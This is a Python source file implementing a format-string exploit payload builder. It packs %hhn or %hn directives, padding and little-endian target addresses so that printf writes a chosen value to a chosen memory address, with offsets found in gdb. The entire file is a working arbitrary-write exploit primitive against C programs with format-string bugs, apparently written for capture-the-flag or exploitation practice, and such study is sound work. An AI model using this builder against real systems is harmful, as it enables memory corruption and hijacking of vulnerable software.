from typing import NamedTuple

Write = tuple[int, int]  # (target address, chunk value)


class _WriteMode(NamedTuple):
    """Everything that differs between %hhn (byte) and %hn (word) writes.

    Derived entirely from the write unit size, so a mode is fully described by
    `unit_bytes` and the rest follows.
    """

    unit_bytes: int  # bytes written per directive (1 or 2).
    conversion: bytes  # printf %n length variant: b"hhn" or b"hn".
    modulus: int  # the counter wraps here (256 or 65536).
    count_digits: int  # fixed width of the %c count field (3 or 5).
    directive_len: int  # constant byte length of one full directive.


class FormatStringBuilder:
    """Builds a format-string write for one value, byte or word-granular.

    The value is written in fixed-size chunks: one byte per %hhn directive
    or two bytes per %hn directive . Each chunk needs its own directive of
    the form "%<count>c%<slot>$<n>":

        %<count>c    print <count> filler characters, advancing printf's
                     internal "characters written so far" counter.
        %<slot>$<n>  store the low byte(s) of that counter through the pointer
                     found at positional argument <slot> (<n> is hhn or hn).

    Both numeric fields are padded to a fixed width, so every directive in a
    given mode is the same length (the width depends on the write size).
    The payload is built in a single pass with no fixpoint iteration.

    Payload layout (offsets are bytes from the start of the payload):

        0                    directives_len     address_offset
        |  directives        |  'A' filler      |  pointer block  |
           %064c%028$hhn...                        <LE addresses>

      * Filler pads up to address_offset. It sits AFTER every %n, so the
        characters it prints never perturb the counter the %n read.
      * The pointer block is last because addresses contain NUL bytes that
        end printf's parsing. By then every write is done, and each address
        is consumed as a positional argument rather than parsed as text.

    build_*() take two constants that describe the write site, found once in gdb:

        arg_offset  positional argument index that reads the first
                    stack-aligned qword of the payload.
        align       byte offset within the payload of that first aligned
                    qword, i.e. (-buffer_address) % 8. Zero when the input
                    buffer is already 8-byte aligned on the stack.

    A positional argument at index `arg_offset + q` reads the qword at byte
    offset `align + 8*q`; that mapping is what ties byte layout to argument
    numbers.
    """

    _SLOT_DIGITS: int = 3  # positional argument number, zero-padded to a fixed width.
    _ALIGNMENT: int = 8  # a positional argument reads one 8-byte qword.

    # Only byte and word writes are practical: a wider unit needs a character
    # count the counter can never reach (2**32 and up).
    _CONVERSIONS: dict[int, bytes] = {1: b"hhn", 2: b"hn"}

    def __init__(self, *, arch_bytes: int = 8, max_len: int = 0x100) -> None:
        self._arch_bytes = arch_bytes
        self._max_len = max_len

    def build_with_bytes(
        self, addr: int, value: int, arg_offset: int, *, align: int = 0, size: int = 8
    ) -> bytes:
        """Write `value` one byte at a time with %hhn (8 directives per qword)."""
        return self._build(addr, value, arg_offset, align, size, unit_bytes=1)

    def build_with_words(
        self, addr: int, value: int, arg_offset: int, *, align: int = 0, size: int = 8
    ) -> bytes:
        """Write `value` two bytes at a time with %hn (4 directives per qword)."""
        return self._build(addr, value, arg_offset, align, size, unit_bytes=2)

    def _build(
        self,
        addr: int,
        value: int,
        arg_offset: int,
        align: int,
        size: int,
        unit_bytes: int,
    ) -> bytes:
        """Return the payload that writes `value` (`size` bytes) to `addr`."""
        mode = self._write_mode(unit_bytes)
        self._check_size(size, mode)
        align %= self._ALIGNMENT

        chunk_writes = self._split_into_writes(addr, value, size, mode)
        ordered_writes = self._sort_by_value(chunk_writes)
        write_count = len(ordered_writes)

        address_offset = self._address_offset(write_count, align, mode)
        base_slot = self._base_slot(address_offset, arg_offset, align)

        directives = self._render_directives(ordered_writes, base_slot, mode)
        payload = self._assemble(directives, address_offset, ordered_writes)
        self._ensure_fits(payload)
        return payload

    def _write_mode(self, unit_bytes: int) -> _WriteMode:
        """Resolve the fixed facts of a byte or word write from its unit size."""
        conversion = self._CONVERSIONS.get(unit_bytes)
        if conversion is None:
            raise ValueError(
                f"unit_bytes must be 1 (byte) or 2 (word); a {unit_bytes}-byte "
                f"write needs a character count the counter can never reach"
            )
        modulus = 1 << (8 * unit_bytes)
        count_digits = len(str(modulus))
        directive_len = (1 + count_digits + 1) + (  # %<count>c
            1 + self._SLOT_DIGITS + 1 + len(conversion)
        )  # %<slot>$<conversion>
        return _WriteMode(unit_bytes, conversion, modulus, count_digits, directive_len)

    def _check_size(self, size: int, mode: _WriteMode) -> None:
        """Reject a size the write unit cannot tile evenly."""
        if size % mode.unit_bytes:
            raise ValueError(
                f"size {size} is not a multiple of the {mode.unit_bytes}-byte write unit"
            )

    def _split_into_writes(
        self, addr: int, value: int, size: int, mode: _WriteMode
    ) -> list[Write]:
        """Break `value` into (address, chunk) writes, least-significant first."""
        unit = mode.unit_bytes
        mask = mode.modulus - 1
        chunk_bits = 8 * unit
        return [
            (addr + i * unit, (value >> (chunk_bits * i)) & mask)
            for i in range(size // unit)
        ]

    def _sort_by_value(self, writes: list[Write]) -> list[Write]:
        """Order ascending so the printf counter only ever moves forward."""
        return sorted(writes, key=lambda write: write[1])

    def _address_offset(self, num_writes: int, align: int, mode: _WriteMode) -> int:
        """Byte offset where the pointer block starts: the first aligned qword
        at or after the directives."""
        directives_len = self._directives_len(num_writes, mode)
        return self._round_up_to_aligned(directives_len, align)

    def _directives_len(self, num_writes: int, mode: _WriteMode) -> int:
        """Byte length of the directive section (constant per write)."""
        return num_writes * mode.directive_len

    def _base_slot(self, address_offset: int, arg_offset: int, align: int) -> int:
        """Positional argument number of the first pointer in the block."""
        qword_index = (address_offset - align) // self._ALIGNMENT
        return arg_offset + qword_index

    def _round_up_to_aligned(self, offset: int, align: int) -> int:
        """Smallest offset >= `offset` congruent to `align` mod 8, i.e. the next
        position printf reads as the start of a whole qword."""
        return offset + (align - offset) % self._ALIGNMENT

    def _render_directives(
        self, writes: list[Write], base_slot: int, mode: _WriteMode
    ) -> bytes:
        """Render one "%<count>c%<slot>$<n>" per write, in sorted order."""
        parts: list[bytes] = []
        printed = 0  # printf's running character count, mod modulus.
        for index, (_, chunk) in enumerate(writes):
            # A %c field width of 0 still prints one character, so a repeated
            # chunk (delta 0) instead prints a full modulus-length cycle,
            # wrapping the low bytes back to the same value.
            advance = (chunk - printed) % mode.modulus or mode.modulus
            printed = (printed + advance) % mode.modulus
            slot = base_slot + index

            count_field = self._fixed_width_field(advance, mode.count_digits)
            slot_field = self._fixed_width_field(slot, self._SLOT_DIGITS)
            parts.append(b"%" + count_field + b"c")
            parts.append(b"%" + slot_field + b"$" + mode.conversion)
        return b"".join(parts)

    def _render_pointer_block(self, writes: list[Write]) -> bytes:
        """Pack target addresses, ordered to match the directives' slots."""
        packed_addresses = [self._pack_address(target) for target, _ in writes]
        return b"".join(packed_addresses)

    def _assemble(
        self, directives: bytes, address_offset: int, writes: list[Write]
    ) -> bytes:
        """Pad the directives to the aligned pointer position, then append it."""
        padded_directives = directives.ljust(address_offset, b"A")
        pointer_block = self._render_pointer_block(writes)
        return padded_directives + pointer_block

    def _pack_address(self, address: int) -> bytes:
        """Encode one address as little-endian pointer-width bytes."""
        return address.to_bytes(self._arch_bytes, "little")

    def _ensure_fits(self, payload: bytes) -> None:
        """Reject a payload larger than the target's input buffer."""
        if len(payload) > self._max_len:
            raise ValueError(
                f"payload is {len(payload)} bytes, exceeds the "
                f"{self._max_len}-byte input limit"
            )

    def _fixed_width_field(self, value: int, digits: int) -> bytes:
        """Zero-pad `value` to `digits`, refusing to silently overflow the
        fixed width (which would desynchronize the layout)."""
        rendered = str(value)
        if len(rendered) > digits:
            raise ValueError(f"{value} needs more than {digits} digits")
        return rendered.zfill(digits).encode()
